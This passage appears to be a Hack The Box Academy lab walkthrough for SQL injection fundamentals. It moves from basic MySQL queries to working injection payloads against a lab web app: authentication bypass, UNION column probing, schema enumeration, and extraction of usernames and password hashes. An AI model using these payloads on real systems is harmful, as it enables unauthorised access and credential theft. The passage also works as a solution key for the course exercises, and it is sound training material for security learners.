</tr>
</thead>
<tbody>
<tr>
<td align="center">STMIP</td>
<td align="center">Spawned Target Machine IP Address</td>
</tr>
<tr>
<td align="center">STMPO</td>
<td align="center">Spawned Target Machine Port</td>
</tr>
<tr>
<td align="center">PMVPN</td>
<td align="center">Personal Machine with a Connection to the Academy's VPN</td>
</tr>
<tr>
<td align="center">PWNIP</td>
<td align="center">Pwnbox IP Address (or PMVPN IP Address)</td>
</tr>
<tr>
<td align="center">PWNPO</td>
<td align="center">Pwnbox Port (or PMVPN Port)</td>
</tr>
</tbody>
</table></div>
<h1>Intro to MySQL</h1>
<h2>Question 1</h2>
<h3>"Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?"</h3>
<p>Students first need to connect to the MySQL server on the spawned target machine, using the credentials <code>root:password</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell">mysql -h STMIP -P STMPO -u root -ppassword
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -h <span class="token number">46.101</span>.61.42 -P <span class="token number">30658</span> -u root -ppassword</span></span>

<span class="token output">Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
</span></code></pre></div></div>
<p>Then, students need to list all the databases present using the <code>SHOW databases</code> query, and then submit the first database's name as the answer:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SHOW</span> <span class="token keyword">databases</span><span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Intro to MySQL</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [(none)]&gt; SHOW databases;

+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.003 sec)
</span></code></pre></div></div>
<p>Answer: {hidden}</p>
<h1>SQL Statements</h1>
<h2>Question 1</h2>
<h3>"What is the department number for the 'Development' department?"</h3>
<p>Students first need to connect to the MySQL server on the spawned target machine, using the credentials <code>root:password</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell">mysql -h STMIP -P STMPO -u root -ppassword
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Statements</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -h <span class="token number">46.101</span>.61.42 -P <span class="token number">30658</span> -u root -ppassword</span></span>

<span class="token output">Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
</span></code></pre></div></div>
<p>Then, students need to use the <code>employees</code> database, list all the tables within it, and understand the schema of the <code>departments</code> table using the <code>DESCRIBE</code> statement on it:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">USE</span> employees<span class="token punctuation">;</span>
<span class="token keyword">SHOW</span> <span class="token keyword">TABLES</span><span class="token punctuation">;</span>
<span class="token keyword">DESCRIBE</span> departments<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Statements</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [(none)]&gt; USE employees;

Database changed

MariaDB [employees]&gt; SHOW TABLES;

+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.003 sec)

MariaDB [employees]&gt; DESCRIBE departments;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
</span></code></pre></div></div>
<p>At last, students need to use the <code>SELECT</code> statement to retrieve the department number of the department whose name is <code>Development</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> dept_no <span class="token keyword">FROM</span> departments <span class="token keyword">WHERE</span> dept_name<span class="token operator">=</span><span class="token string">"Development"</span><span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Statements</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [employees]&gt; SELECT dept_no FROM departments WHERE dept_name="Development";

+---------+
| dept_no |
+---------+
| d005    |
+---------+
1 row in set (0.003 sec)
</span></code></pre></div></div>
<p>Alternatively, students can just retrieve all data from the <code>departments</code> table to find the answer:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> departments<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Statements</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [employees]&gt; SELECT * FROM departments;

+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| 			&lt;SNIP&gt;             |
+---------+--------------------+
</span></code></pre></div></div>
<p>Answer: {hidden}</p>
<h1>Query Results</h1>
<h2>Question 1</h2>
<h3>"What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?"</h3>
<p>Students first need to connect to the MySQL server on the spawned target machine, using the credentials <code>root:password</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell">mysql -h STMIP -P STMPO -u root -ppassword
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Query Results</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -h <span class="token number">46.101</span>.61.42 -P <span class="token number">30658</span> -u root -ppassword</span></span>

<span class="token output">Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
</span></code></pre></div></div>
<p>Then, students need to use the <code>employees</code> database and understand the schema of the <code>employees</code> table using the <code>DESCRIBE</code> statement on it:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">USE</span> employees<span class="token punctuation">;</span> 
<span class="token keyword">DESCRIBE</span> employees<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Query Results</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [(none)]&gt; use employees;

Database changed

MariaDB [employees]&gt; DESCRIBE employees;

+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
|            |               |&lt;SNIP&gt;|     |         |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.003 sec)
</span></code></pre></div></div>
<p>At last, students need to use the <code>SELECT</code> statement to retrieve the last name of the employee whose first name starts with <code>Bar</code> and was hired on <code>1990-01-01</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> last_name <span class="token keyword">FROM</span> employees <span class="token keyword">WHERE</span> first_name <span class="token operator">LIKE</span> <span class="token string">'Bar%'</span> <span class="token operator">AND</span> hire_date<span class="token operator">=</span><span class="token string">'1990-01-01'</span><span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Query Results</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [employees]&gt; SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';

+-----------+
| last_name |
+-----------+
| Mitchem   |
+-----------+
1 row in set (0.001 sec)
</span></code></pre></div></div>
<p>Answer: {hidden}</p>
<h1>SQL Operators</h1>
<h2>Question 1</h2>
<h3>"In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?"</h3>
<p>Students first need to connect to the MySQL server on the spawned target machine, using the credentials <code>root:password</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell">mysql -h STMIP -P STMPO -u root -ppassword
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Operators</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -h <span class="token number">46.101</span>.61.42 -P <span class="token number">30658</span> -u root -ppassword</span></span>

<span class="token output">Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
</span></code></pre></div></div>
<p>Then, students need to use the <code>employees</code> database and understand the schema of the <code>titles</code> table using the <code>DESCRIBE</code> statement on it:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">USE</span> employees<span class="token punctuation">;</span>
<span class="token keyword">DESCRIBE</span> titles<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Operators</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">Welcome to the MariaDB monitor.  Commands end with ; or \g.
MariaDB [(none)]&gt; USE employees;

Database changed

MariaDB [employees]&gt; DESCRIBE titles;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| emp_no    | int(11)     | NO   | PRI | NULL    |       |
| title     | varchar(50) | NO   | PRI | NULL    |       |
| from_date | date        | NO   | PRI | NULL    |       |
| to_date   | date        | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
4 rows in set (0.003 sec)
</span></code></pre></div></div>
<p>At last, students need to use the <code>SELECT</code> statement with the <code>COUNT()</code> function to retrieve the number of all records where the employee number is greater than 10000 or the employee title does not contain the string <code>engineer</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> titles <span class="token keyword">WHERE</span> emp_no <span class="token operator">&gt;</span> <span class="token number">10000</span> <span class="token operator">OR</span> title <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'%engineer%'</span><span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Operators</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [employees]&gt; SELECT COUNT(*) FROM titles WHERE emp_no &gt; 10000 OR title NOT LIKE '%engineer%';

+----------+
| COUNT(*) |
+----------+
|      654 |
+----------+
1 row in set (0.003 sec)
</span></code></pre></div></div>
<p>Alternatively, students can find out the number of records by retrieving all data without utilizing the <code>COUNT()</code> function:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> titles <span class="token keyword">WHERE</span> emp_no <span class="token operator">&gt;</span> <span class="token number">10000</span> <span class="token operator">OR</span> title <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'%engineer%'</span><span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">SQL Operators</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [employees]&gt; SELECT * FROM titles WHERE emp_no &gt; 10000 OR title NOT LIKE '%engineer%';

+--------+--------------------+------------+------------+
| emp_no | title              | from_date  | to_date    |
+--------+--------------------+------------+------------+
|  10001 | Senior Engineer    | 1986-06-26 | 9999-01-01 |
|  10002 | Senior Engineer    | 1995-12-03 | 9999-01-01 |
|                           &lt;SNIP&gt;                      |
|  10648 | Engineer           | 1987-11-04 | 1993-11-03 |
|  10649 | Senior Engineer    | 1993-11-03 | 9999-01-01 |
|  10650 | Engineer           | 1996-12-25 | 9999-01-01 |
|  10651 | Assistant Engineer | 1988-12-29 | 1997-12-29 |
|  10652 | Engineer           | 1997-12-29 | 2000-11-15 |
|  10653 | Senior Staff       | 2000-03-12 | 9999-01-01 |
|  10654 | Staff              | 1992-03-12 | 2000-03-12 |
+--------+--------------------+------------+------------+
654 rows in set (0.002 sec)
</span></code></pre></div></div>
<p>Answer: {hidden}</p>
<h1>Subverting Query Logic</h1>
<h2>Question 1</h2>
<h3>"Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?"</h3>
<p>Many approaches can be taken to solve this question.</p>
<p>A first approach is whereby students use the semicolon to end the query and then comment out the rest of it:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">tom'<span class="token punctuation">;</span> <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_1.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_1.png"></p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_2.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_2.png"></p>
<p>A second approach is whereby students use the <code>OR</code> operator to subvert the query's logic and then comment out the rest of it:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">tom<span class="token string">' OR '</span><span class="token number">1</span><span class="token string">' = '</span><span class="token number">1</span>' <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_3.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_3.png"></p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_4.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_4.png"></p>
<p>Answer: {hidden}</p>
<h1>Using Comments</h1>
<h2>Question 1</h2>
<h3>"Login as the user with the id 5 to get the flag."</h3>
<p>After knowing the structure of the query by trial and error, students need to bypass it using the following query:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token operator">OR</span> ID<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_5.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_5.png"></p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_6.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_6.png"></p>
<p>Answer: {hidden}</p>
<h1>Union Clause</h1>
<h2>Question 1</h2>
<h3>"Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table."</h3>
<p>Students first need to connect to the MySQL server on the spawned target machine, using the credentials <code>root:password</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell">mysql -h STMIP -P STMPO -u root -ppassword
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Union Clause</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mysql -h <span class="token number">46.101</span>.61.42 -P <span class="token number">30658</span> -u root -ppassword</span></span>

<span class="token output">Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
</span></code></pre></div></div>
<p>Then, students need to use the <code>employees</code> database and understand the schema of the <code>employees</code> and <code>departments</code> tables by using the <code>DESCRIBE</code> statement on them:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">USE</span> employees<span class="token punctuation">;</span>
<span class="token keyword">DESCRIBE</span> employees<span class="token punctuation">;</span>
<span class="token keyword">DESCRIBE</span> departments<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Union Clause</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [(none)]&gt; use employees;

Database changed

MariaDB [employees]&gt; DESCRIBE employees;

+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.003 sec)

MariaDB [employees]&gt; DESCRIBE departments;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
</span></code></pre></div></div>
<p>Since the <code>departments</code> table has lesser number of columns compared to <code>employees</code>, students need to inject 4 more "dummy columns" when executing the <code>UNION</code> query:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> employees <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> dept_no<span class="token punctuation">,</span>dept_name<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> departments<span class="token punctuation">)</span> Foo<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Union Clause</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">MariaDB [employees]&gt; SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;

+----------+
| COUNT(*) |
+----------+
|      663 |
+----------+
1 row in set (0.005 sec)
</span></code></pre></div></div>
<p>Alternatively, students can find out the number of records by just retrieving all data without the <code>COUNT()</code> function:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> employees <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> dept_no<span class="token punctuation">,</span>dept_name<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> departments<span class="token punctuation">;</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Union Clause</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">+--------+--------------------+--------------+
| emp_no | birth_date         | first_name   |
+--------+--------------------+--------------+
| 10001  | 1953-09-02         | Georgi       |
| 10002  | 1952-12-03         | Vivian       |
|                     &lt;SNIP&gt;                 |
+--------+--------------------+--------------+
663 rows in set (0.006 sec)
</span></code></pre></div></div>
<p>Answer: {hidden}</p>
<h1>Union Injection</h1>
<h2>Question 1</h2>
<h3>"Use a Union injection to get the result of 'user()'"</h3>
<p>Students first need to detect the number of columns being selected in the query ran by the backend of the web-application. Either <code>ORDER BY</code> or <code>UNION</code> injections can be used. Using the <code>UNION</code> statement injection, students will need to execute queries until no error message is received, i.e., until the number of columns match:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_7.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_7.png"></p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_8.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_8.png"></p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_9.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_9.png"></p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_10.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_10.png"></p>
<p>Since there are four columns, students need to inject the <code>user()</code> function in either the 2nd, 3rd, or 4th column:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_11.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_11.png"></p>
<p>Answer: {hidden}</p>
<h1>Database Enumeration</h1>
<h2>Question 1</h2>
<h3>"What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?"</h3>
<p>Since students are given the names of the database and the table, they only need to enumerate the names of columns within the <code>users</code> table:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo<span class="token string">' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='</span>users'<span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_12.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_12.png"></p>
<p>At last, students need to use the <code>UNION</code> injection statement to fetch the <code>username</code> and <code>password</code> columns from the <code>users</code> table within the <code>ilfreight</code> database:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">FROM</span> ilfreight<span class="token punctuation">.</span>users<span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_13.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_13.png"></p>
<p>Answer: {hidden}</p>
<h1>Reading Files</h1>
<h2>Question 1</h2>
